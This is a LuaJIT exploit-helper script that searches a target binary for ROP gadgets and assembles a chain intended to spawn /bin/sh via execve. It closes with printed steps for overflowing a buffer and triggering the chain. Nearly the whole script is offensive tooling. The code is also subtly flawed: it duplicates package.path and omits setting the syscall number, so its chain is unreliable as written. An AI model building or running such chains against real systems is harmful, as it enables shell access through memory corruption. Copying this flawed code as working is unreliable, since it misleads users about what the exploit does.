#!/usr/bin/env luajit
-- rop_builder.lua - Pure LuaJIT ROP chain generator

-- Fix the path
package.path = "./lib/?.lua;" .. package.path .. package.path

local rop = require("rop")

local function build_execve_chain(binary_path)
    print("[*] Building execve(\"/bin/sh\") chain for " .. binary_path)
    
    local gadgets = rop.find_gadgets(binary_path)
    
    if #gadgets == 0 then
        print("[-] No gadgets found. Binary might be stripped or small.")
        return nil
    end
    
    -- Find required gadgets
    local pop_rdi = nil
    local pop_rsi = nil
    local pop_rdx = nil
    local syscall = nil
    
    for _, g in ipairs(gadgets) do
        if g.name == "pop_rdi_ret" then pop_rdi = g.address end
        if g.name == "pop_rsi_ret" then pop_rsi = g.address end
        if g.name == "pop_rdx_ret" then pop_rdx = g.address end
        if g.name == "syscall_ret" then syscall = g.address end
    end
    
    if pop_rdi and pop_rsi and pop_rdx and syscall then
        print("[+] Found all required gadgets!")
        
        local chain = {
            pop_rdi, 0x404000,  -- rdi = "/bin/sh"
            pop_rsi, 0,         -- rsi = NULL
            pop_rdx, 0,         -- rdx = NULL
            syscall             -- execve()
        }
        
        return chain
    else
        print("[-] Missing some gadgets")
        rop.print_gadgets(gadgets)
        return nil
    end
end

-- Test
local binary = arg[1] or "/bin/bash"
print("[*] Target: " .. binary)

local chain = build_execve_chain(binary)

if chain then
    print("\n[+] ROP Chain:")
    for i, addr in ipairs(chain) do
        print(string.format("    [%d] 0x%X", i, addr))
    end
    
    print("\n[*] To exploit:")
    print("    1. Overflow buffer with chain addresses")
    print("    2. Place \"/bin/sh\" at 0x404000")
    print("    3. Trigger return")
else
    print("\n[-] Could not build chain")
end
